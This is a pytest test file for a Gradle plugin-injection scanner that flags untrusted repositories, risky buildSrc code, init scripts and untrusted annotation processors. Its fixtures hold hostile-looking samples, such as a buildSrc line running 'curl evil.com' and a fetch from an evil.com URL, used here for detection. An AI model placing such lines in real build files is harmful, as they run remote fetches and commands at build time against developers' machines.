"""Tests for GradlePluginScanner — Gradle plugin injection detection."""

from __future__ import annotations

import asyncio
import tempfile
from pathlib import Path

import pytest

from depfence.scanners.gradle_plugin_scanner import GradlePluginScanner


@pytest.fixture
def scanner():
    return GradlePluginScanner()


def run(coro):
    return asyncio.get_event_loop().run_until_complete(coro)


class TestUntrustedRepos:
    def test_trusted_repos_no_findings(self, scanner, tmp_path):
        (tmp_path / "settings.gradle").write_text(
            'pluginManagement {\n  repositories {\n    mavenCentral()\n    google()\n    gradlePluginPortal()\n  }\n}'
        )
        findings = run(scanner.scan_project(tmp_path))
        gp01 = [f for f in findings if "GP-01" in f.title]
        assert gp01 == []

    def test_untrusted_repo_flagged(self, scanner, tmp_path):
        (tmp_path / "settings.gradle.kts").write_text(
            'pluginManagement {\n  repositories {\n    maven { url = uri("https://evil.example.com/repo") }\n  }\n}'
        )
        findings = run(scanner.scan_project(tmp_path))
        gp01 = [f for f in findings if "GP-01" in f.title]
        assert len(gp01) == 1
        assert gp01[0].severity.value == "critical"
        assert "evil.example.com" in gp01[0].detail

    def test_multiple_untrusted_repos(self, scanner, tmp_path):
        (tmp_path / "settings.gradle").write_text(
            'pluginManagement {\n  repositories {\n'
            '    maven { url = uri("https://attacker1.com/m2") }\n'
            '    maven { url = uri("https://attacker2.com/repo") }\n'
            '  }\n}'
        )
        findings = run(scanner.scan_project(tmp_path))
        gp01 = [f for f in findings if "GP-01" in f.title]
        assert len(gp01) == 2


class TestBuildSrc:
    def test_clean_buildsrc_no_findings(self, scanner, tmp_path):
        buildsrc = tmp_path / "buildSrc" / "src" / "main" / "kotlin"
        buildsrc.mkdir(parents=True)
        (buildsrc / "Convention.kt").write_text("class Convention { val x = 1 }")
        findings = run(scanner.scan_project(tmp_path))
        gp02 = [f for f in findings if "GP-02" in f.title]
        assert gp02 == []

    def test_dangerous_buildsrc_flagged(self, scanner, tmp_path):
        buildsrc = tmp_path / "buildSrc" / "src" / "main" / "kotlin"
        buildsrc.mkdir(parents=True)
        (buildsrc / "Downloader.kt").write_text(
            'import java.net.URL\nfun fetch() { URL("https://evil.com").readText() }'
        )
        findings = run(scanner.scan_project(tmp_path))
        gp02 = [f for f in findings if "GP-02" in f.title]
        assert len(gp02) == 1
        assert gp02[0].severity.value == "high"

    def test_runtime_exec_in_buildsrc(self, scanner, tmp_path):
        buildsrc = tmp_path / "buildSrc" / "src"
        buildsrc.mkdir(parents=True)
        (buildsrc / "Plugin.java").write_text(
            'class Plugin { void run() { Runtime.getRuntime().exec("curl evil.com"); } }'
        )
        findings = run(scanner.scan_project(tmp_path))
        gp02 = [f for f in findings if "GP-02" in f.title]
        assert len(gp02) == 1


class TestInitGradle:
    def test_init_gradle_flagged(self, scanner, tmp_path):
        gradle_dir = tmp_path / ".gradle"
        gradle_dir.mkdir()
        (gradle_dir / "init.gradle").write_text("allprojects { apply plugin: 'evil' }")
        findings = run(scanner.scan_project(tmp_path))
        gp05 = [f for f in findings if "GP-05" in f.title]
        assert len(gp05) == 1
        assert gp05[0].severity.value == "high"

    def test_no_init_gradle_no_findings(self, scanner, tmp_path):
        findings = run(scanner.scan_project(tmp_path))
        gp05 = [f for f in findings if "GP-05" in f.title]
        assert gp05 == []


class TestAnnotationProcessors:
    def test_trusted_kapt_no_findings(self, scanner, tmp_path):
        (tmp_path / "build.gradle.kts").write_text(
            'dependencies {\n  kapt("com.google.dagger:hilt-compiler:2.50")\n}'
        )
        findings = run(scanner.scan_project(tmp_path))
        gp06 = [f for f in findings if "GP-06" in f.title]
        assert gp06 == []

    def test_untrusted_kapt_flagged(self, scanner, tmp_path):
        (tmp_path / "build.gradle").write_text(
            'dependencies {\n  kapt "com.shady.lib:processor:1.0.0"\n}'
        )
        findings = run(scanner.scan_project(tmp_path))
        gp06 = [f for f in findings if "GP-06" in f.title]
        assert len(gp06) == 1
        assert gp06[0].severity.value == "high"
        assert "shady" in gp06[0].detail

    def test_ksp_untrusted_flagged(self, scanner, tmp_path):
        (tmp_path / "build.gradle.kts").write_text(
            'dependencies {\n  ksp("io.evil:codegen:0.1")\n}'
        )
        findings = run(scanner.scan_project(tmp_path))
        gp06 = [f for f in findings if "GP-06" in f.title]
        assert len(gp06) == 1


class TestPluginVersionRanges:
    def test_pinned_version_no_findings(self, scanner, tmp_path):
        (tmp_path / "build.gradle").write_text(
            'plugins {\n  id "com.android.application" version "8.2.0"\n}'
        )
        findings = run(scanner.scan_project(tmp_path))
        gp04 = [f for f in findings if "GP-04" in f.title]
        assert gp04 == []

    def test_version_range_flagged(self, scanner, tmp_path):
        (tmp_path / "build.gradle.kts").write_text(
            'plugins {\n  id("com.android.application") version "[8.0,9.0)"\n}'
        )
        findings = run(scanner.scan_project(tmp_path))
        gp04 = [f for f in findings if "GP-04" in f.title]
        assert len(gp04) == 1
        assert gp04[0].severity.value == "medium"


class TestEmptyProject:
    def test_no_gradle_files_no_findings(self, scanner, tmp_path):
        findings = run(scanner.scan_project(tmp_path))
        assert findings == []
